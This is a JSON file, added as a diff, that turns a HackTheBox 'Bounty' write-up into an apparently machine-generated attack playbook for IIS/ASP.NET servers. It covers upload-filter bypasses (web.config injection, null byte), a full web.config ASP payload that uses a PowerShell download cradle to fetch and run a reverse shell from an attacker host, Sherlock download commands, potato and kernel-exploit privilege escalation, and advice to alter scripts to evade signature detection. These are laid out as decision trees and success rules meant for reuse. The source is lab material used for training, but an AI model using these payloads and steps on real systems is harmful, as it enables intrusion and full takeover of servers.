@@ -1,0 +1,880 @@
+{
+  "writeup_id": "Htb_Bounty",
+  "scenario_fingerprint": {
+    "scenario_name": "iis_file_upload_webconfig_rce",
+    "primary_services": [
+      "http",
+      "iis"
+    ],
+    "port_signature": "80",
+    "service_combination": "iis+asp_net",
+    "os_family": "windows",
+    "environment_type": "web_server",
+    "entry_vector": "file_upload_bypass",
+    "privilege_path": "web_user_to_system",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "file_upload_functionality",
+      "extension_filtering_bypass",
+      "webconfig_execution",
+      "asp_net_powered"
+    ],
+    "environmental_clues": [
+      "iis_7_5_server",
+      "transfer_aspx_endpoint",
+      "uploadedfiles_directory",
+      "aspnet_headers"
+    ],
+    "similar_scenarios": [
+      "granny_htb_easy",
+      "grandpa_htb_easy"
+    ],
+    "unique_aspects": [
+      "webconfig_asp_code_execution",
+      "null_byte_upload_bypass",
+      "powershell_download_cradle"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "web.config_asp_injection",
+        "success_reason": "IIS allowed web.config upload and execution of embedded ASP code",
+        "prerequisite_indicators": [
+          "iis_server_detected",
+          "file_upload_functionality",
+          "asp_net_powered_site",
+          "insufficient_upload_filtering"
+        ],
+        "recognition_patterns": [
+          "X-Powered-By: ASP.NET header",
+          "Microsoft-IIS server header",
+          "upload form present",
+          "web.config not filtered"
+        ],
+        "failure_modes": [
+          "web_config_upload_blocked",
+          "asp_execution_disabled",
+          "strict_file_extension_filtering",
+          "upload_directory_not_web_accessible"
+        ],
+        "environmental_factors": [
+          "default_iis_configuration",
+          "legacy_server_2008_r2",
+          "insufficient_upload_restrictions",
+          "web_accessible_upload_directory"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "null_byte_upload_bypass",
+        "success_reason": "Upload filter checked extension but saved file with original name",
+        "prerequisite_indicators": [
+          "client_side_filtering_present",
+          "file_extension_blacklist",
+          "legacy_application_framework"
+        ],
+        "recognition_patterns": [
+          "upload rejection on .aspx files",
+          "filename.aspx%00.jpg accepted",
+          "server processes null byte incorrectly"
+        ],
+        "failure_modes": [
+          "server_side_validation_robust",
+          "null_byte_handling_fixed",
+          "file_content_inspection"
+        ],
+        "environmental_factors": [
+          "legacy_asp_net_framework",
+          "insufficient_input_validation",
+          "client_side_security_reliance"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "kernel_exploit_privilege_escalation",
+        "success_reason": "Windows Server 2008 R2 Build 7600 unpatched and vulnerable",
+        "prerequisite_indicators": [
+          "legacy_windows_version",
+          "missing_security_patches",
+          "build_7600_detected"
+        ],
+        "recognition_patterns": [
+          "OS Version: 6.1.7600 N/A Build 7600",
+          "no hotfixes installed",
+          "multiple kernel exploits available"
+        ],
+        "failure_modes": [
+          "system_fully_patched",
+          "exploit_mitigation_enabled",
+          "architecture_mismatch"
+        ],
+        "environmental_factors": [
+          "unpatched_legacy_system",
+          "default_security_configuration",
+          "no_exploit_protection"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "5-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "file_upload_functionality",
+        "discovery_method": "gobuster directory enumeration",
+        "why_critical": "Led to code execution via web.config injection",
+        "how_to_recognize": [
+          "/transfer.aspx endpoint found",
+          "/uploadedFiles directory accessible",
+          "file upload form present"
+        ],
+        "follow_up_actions": [
+          "test_file_upload_restrictions",
+          "attempt_web_config_upload",
+          "check_uploaded_file_execution"
+        ]
+      },
+      {
+        "discovery": "legacy_unpatched_system",
+        "discovery_method": "systeminfo command execution",
+        "why_critical": "Multiple kernel exploits available for privilege escalation",
+        "how_to_recognize": [
+          "Windows Server 2008 R2 Build 7600",
+          "no installed hotfixes",
+          "datacenter edition"
+        ],
+        "follow_up_actions": [
+          "run_watson_enumeration",
+          "test_ms10_059_exploit",
+          "check_token_privileges"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "low_privileged_user",
+        "escalation_method": "kernel_exploit_ms10_059",
+        "why_possible": "Unpatched Windows Server 2008 R2 vulnerable to multiple kernel exploits",
+        "recognition_signs": [
+          "build_7600_no_service_pack",
+          "watson_shows_vulnerabilities",
+          "chimichurri_exploit_available"
+        ],
+        "exploitation_path": "Upload exploit → Execute → SYSTEM shell"
+      },
+      {
+        "privilege_level": "web_application",
+        "escalation_method": "web_config_asp_injection",
+        "why_possible": "IIS misconfiguration allows web.config upload and ASP execution",
+        "recognition_signs": [
+          "asp_net_application",
+          "unrestricted_file_upload",
+          "web_config_not_filtered"
+        ],
+        "exploitation_path": "Upload web.config → ASP execution → PowerShell reverse shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Only port 80 open on Windows host running IIS 7.5",
+        "decision": "Focus on web application exploitation and file upload vulnerabilities",
+        "reasoning": "Limited attack surface requires deep web app analysis, IIS suggests ASP.NET",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "to find hidden endpoints"
+          },
+          {
+            "option": "iis_specific_exploits",
+            "when": "if standard web attacks fail"
+          }
+        ],
+        "success_indicators": [
+          "file_upload_functionality_found",
+          "aspx_extensions_discovered",
+          "uploadedfiles_directory_accessible"
+        ],
+        "next_decision": "analyze_upload_restrictions"
+      },
+      {
+        "step": 2,
+        "situation": "File upload form found with extension filtering",
+        "decision": "Test web.config upload for ASP code execution",
+        "reasoning": "web.config files can contain executable ASP code and bypass extension filters",
+        "confidence": 0.85,
+        "prerequisites": [
+          "file_upload_form_identified",
+          "asp_net_confirmed"
+        ],
+        "success_indicators": [
+          "web_config_upload_successful",
+          "asp_code_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "null_byte_injection",
+          "double_extension_bypass",
+          "mime_type_manipulation"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Code execution achieved via web.config",
+        "decision": "Use PowerShell download cradle for reverse shell",
+        "reasoning": "Direct shell more reliable than webshell due to file cleanup",
+        "confidence": 0.95,
+        "prerequisites": [
+          "asp_code_execution",
+          "powershell_available"
+        ],
+        "success_indicators": [
+          "reverse_shell_established"
+        ],
+        "failure_fallbacks": [
+          "webshell_approach",
+          "certutil_download",
+          "bitsadmin_download"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Shell as unprivileged user on unpatched Windows Server 2008 R2",
+        "decision": "Check SeImpersonatePrivilege first, then kernel exploits",
+        "reasoning": "Token privileges faster than kernel exploits and more reliable",
+        "confidence": 0.9,
+        "prerequisites": [
+          "user_shell_obtained"
+        ],
+        "success_indicators": [
+          "seimpersonateprivilege_enabled",
+          "no_hotfixes_installed"
+        ],
+        "failure_fallbacks": [
+          "watson_enumeration",
+          "kernel_exploit_search"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_upload_form_found": {
+        "action": "test_web_config_upload",
+        "tools": [
+          "burp_suite",
+          "custom_web_config"
+        ],
+        "next_phase": "code_execution_attempt"
+      },
+      "if_extension_filtering_present": {
+        "action": "try_bypass_techniques",
+        "alternatives": [
+          "web_config_upload",
+          "null_byte_injection",
+          "double_extension"
+        ],
+        "decision_criteria": "based_on_asp_net_environment"
+      },
+      "if_code_execution_achieved": {
+        "action": "establish_persistent_shell",
+        "purpose": "avoid_file_cleanup_issues",
+        "tools": [
+          "nishang",
+          "powershell_reverse_shell"
+        ]
+      },
+      "if_seimpersonateprivilege_enabled": {
+        "action": "use_potato_attack",
+        "tools": [
+          "lonelypotato",
+          "juicypotato"
+        ],
+        "next_phase": "system_access"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_web_config_upload_on_asp_net",
+        "reasoning": "web_config_can_execute_asp_code_and_bypass_filters",
+        "applicability": "iis_asp_net_applications"
+      },
+      {
+        "rule": "check_seimpersonateprivilege_before_kernel_exploits",
+        "reasoning": "token_privilege_attacks_more_reliable_than_kernel_exploits",
+        "applicability": "web_service_user_context"
+      },
+      {
+        "rule": "use_powershell_download_cradle_for_payload_delivery",
+        "reasoning": "native_windows_capability_with_high_success_rate",
+        "applicability": "windows_targets_with_internet_access"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Web.config Upload RCE",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "iis_web_server",
+          "asp_net_enabled",
+          "file_upload_functionality",
+          "unrestricted_file_upload"
+        ],
+        "success_indicators": [
+          "web_config_upload_accepted",
+          "asp_code_execution_confirmed",
+          "iis_error_pages_visible"
+        ],
+        "incompatible_with": [
+          "apache_web_server",
+          "nginx_web_server",
+          "strict_file_extension_filtering",
+          "upload_directory_isolation"
+        ],
+        "confidence_boosters": [
+          "asp_net_header_present",
+          "iis_version_detected",
+          "uploadedfiles_directory_accessible",
+          "file_extension_bypass_possible"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "File Upload Bypass",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "client_side_filtering_only",
+          "weak_server_side_validation"
+        ],
+        "success_indicators": [
+          "null_byte_bypass_works",
+          "double_extension_accepted",
+          "mime_type_bypass_successful"
+        ],
+        "incompatible_with": [
+          "strong_server_side_validation",
+          "whitelist_based_filtering",
+          "file_content_inspection"
+        ],
+        "confidence_boosters": [
+          "javascript_validation_only",
+          "predictable_upload_directory",
+          "direct_file_access_possible"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_service_running",
+          "hidden_directories_exist",
+          "no_rate_limiting"
+        ],
+        "success_indicators": [
+          "status_200_responses",
+          "status_301_redirects",
+          "different_response_sizes"
+        ],
+        "incompatible_with": [
+          "aggressive_rate_limiting",
+          "ip_blocking_enabled",
+          "custom_404_pages"
+        ],
+        "confidence_boosters": [
+          "default_web_server_installation",
+          "common_cms_detected",
+          "predictable_naming_conventions"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "iis_asp_net": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "ASP.NET"
+        ],
+        "header_indicators": [
+          "X-Powered-By: ASP.NET",
+          "Server: Microsoft-IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "file_upload_service": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "path_indicators": [
+          "/upload",
+          "/transfer",
+          "/files"
+        ],
+        "form_indicators": [
+          "file",
+          "upload",
+          "browse"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_web_server": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "Windows"
+        ],
+        "technology_indicators": [
+          "asp",
+          "aspx",
+          "web.config"
+        ],
+        "confidence_threshold": 0.88
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "web_config_upload_rce",
+          "when": "iis_asp_net_detected_and_file_upload_present",
+          "reason": "direct_code_execution_bypass_most_filters"
+        },
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_functionality_and_upload_endpoints"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "file_upload_bypass",
+          "when": "upload_functionality_found",
+          "reason": "may_lead_to_webshell_upload"
+        },
+        {
+          "attack": "null_byte_injection",
+          "when": "file_extension_filtering_detected",
+          "reason": "common_bypass_technique"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "mime_type_bypass",
+          "when": "content_type_validation_present",
+          "reason": "requires_specific_server_configuration"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Web.config ASP Code Injection",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "gobuster",
+            "command_template": "gobuster -u {url} -w {wordlist} -t {threads} -x {extensions}",
+            "actual_command": "gobuster -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx",
+            "output_pattern": "/transfer.aspx (Status: 200)",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "web.config_upload",
+            "command_template": "Upload web.config with ASP code embedded",
+            "actual_command": "<%@ Language=VBScript %>\n<% call Server.CreateObject(\"WSCRIPT.SHELL\").Run(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')\") %>",
+            "success_factors": [
+              "asp_net_server",
+              "file_upload_functionality",
+              "web_config_execution_allowed"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality",
+          "asp_net_server",
+          "web_config_processing_enabled"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "asp_code_execution_confirmed",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "upload_restrictions_too_strict",
+          "web_config_execution_disabled",
+          "antivirus_blocking_payload"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation_enumeration",
+          "kernel_exploit_identification",
+          "token_privilege_abuse"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Kernel Exploit Enumeration",
+        "mitre_id": "T1068",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "Sherlock",
+            "command_template": "iex(new-object net.webclient).downloadstring('{sherlock_url}'); Find-AllVulns",
+            "actual_command": "iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1'); Find-AllVulns",
+            "output_pattern": "VulnStatus : Appears Vulnerable",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "systeminfo",
+            "command_template": "systeminfo",
+            "actual_command": "systeminfo",
+            "success_factors": [
+              "unpatched_system",
+              "missing_hotfixes"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "user_level_access",
+          "unpatched_windows_system",
+          "powershell_access"
+        ],
+        "success_indicators": [
+          "hotfix_status_shows_na",
+          "vulnerable_kernel_versions_identified",
+          "exploit_availability_confirmed"
+        ],
+        "common_failures": [
+          "system_fully_patched",
+          "exploit_incompatible_with_architecture",
+          "insufficient_privileges_for_exploitation"
+        ],
+        "follow_up_techniques": [
+          "ms10_092_exploitation",
+          "ms15_051_exploitation",
+          "token_privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Token Privilege Escalation",
+        "mitre_id": "T1134.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "whoami",
+            "command_template": "whoami /priv",
+            "actual_command": "whoami /priv",
+            "output_pattern": "SeImpersonatePrivilege.*Enabled",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "LonelyPotato",
+            "command_template": "LonelyPotato.exe {command}",
+            "actual_command": "LonelyPotato.exe whoami",
+            "success_factors": [
+              "seimpersonateprivilege_enabled",
+              "web_service_context"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "seimpersonateprivilege_enabled",
+          "web_service_execution_context",
+          "windows_system"
+        ],
+        "success_indicators": [
+          "seimpersonateprivilege_present_and_enabled",
+          "successful_token_impersonation",
+          "system_level_command_execution"
+        ],
+        "common_failures": [
+          "privilege_not_available",
+          "exploit_patched",
+          "insufficient_system_resources"
+        ],
+        "follow_up_techniques": [
+          "credential_dumping",
+          "persistence_establishment",
+          "lateral_movement"
+        ],
+        "time_investment": "5-20 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "dirb"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists_for_technology",
+          "include_relevant_file_extensions",
+          "adjust_thread_count_based_on_target_stability"
+        ]
+      },
+      {
+        "tool": "Sherlock",
+        "use_case": "windows_kernel_exploit_identification",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_privilege_escalation"
+        ],
+        "alternatives": [
+          "Watson",
+          "windows-exploit-suggester"
+        ],
+        "best_practices": [
+          "run_after_obtaining_initial_access",
+          "cross_reference_results_with_system_architecture",
+          "verify_exploit_compatibility_before_execution"
+        ]
+      },
+      {
+        "tool": "Nishang",
+        "use_case": "powershell_reverse_shells",
+        "effectiveness_rating": 5,
+        "reliability": 0.92,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_post_exploitation"
+        ],
+        "alternatives": [
+          "Empire",
+          "PowerSploit",
+          "custom_powershell"
+        ],
+        "best_practices": [
+          "modify_scripts_to_avoid_signature_detection",
+          "add_callback_line_at_end_of_script",
+          "host_on_reliable_web_server_for_download"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "web_config_rce_to_system",
+        "steps": [
+          {
+            "step": 1,
+            "command": "gobuster -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx",
+            "purpose": "Discover upload functionality",
+            "expected_output": "/transfer.aspx and /uploadedFiles directories"
+          },
+          {
+            "step": 2,
+            "command": "Upload web.config with embedded ASP code",
+            "purpose": "Achieve code execution via configuration file",
+            "expected_output": "File upload successful message"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.10.93/uploadedfiles/web.config",
+            "purpose": "Trigger ASP code execution",
+            "expected_output": "Reverse shell connection established"
+          },
+          {
+            "step": 4,
+            "command": "whoami /priv",
+            "purpose": "Check for privilege escalation opportunities",
+            "expected_output": "SeImpersonatePrivilege Enabled"
+          },
+          {
+            "step": 5,
+            "command": "systeminfo",
+            "purpose": "Identify kernel exploit opportunities",
+            "expected_output": "Hotfix(s): N/A indicating unpatched system"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "20-45 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Bounty",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2018-06-16",
+      "author": "mrb3n",
+      "estimated_time": "45-60 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_application",
+        "file_upload"
+      ],
+      "key_vulnerabilities": [
+        "file_upload_bypass",
+        "kernel_exploits",
+        "token_privileges"
+      ],
+      "environment_type": "windows_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "file_upload_attacks",
+        "web_config_exploitation",
+        "windows_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_security",
+        "asp_net_fundamentals",
+        "windows_basics"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "file_upload",
+        "privilege_escalation",
+        "kernel_exploits"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_file_uploads",
+        "input_validation",
+        "patch_management",
+        "least_privilege"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Granny",
+        "Grandpa",
+        "Devel"
+      ],
+      "similarity_reasons": [
+        "iis_exploitation",
+        "file_upload_attacks",
+        "windows_kernel_exploits"
+      ],
+      "unique_aspects": [
+        "web_config_upload",
+        "watson_enumeration",
+        "token_privilege_escalation"
+      ],
+      "difficulty_factors": [
+        "straightforward_upload_bypass",
+        "multiple_escalation_paths",
+        "well_documented_techniques"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T00:11:45.166579",
+    "original_file": "0xdf_writeups/Htb Bounty.md",
+    "content_length": 28765,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
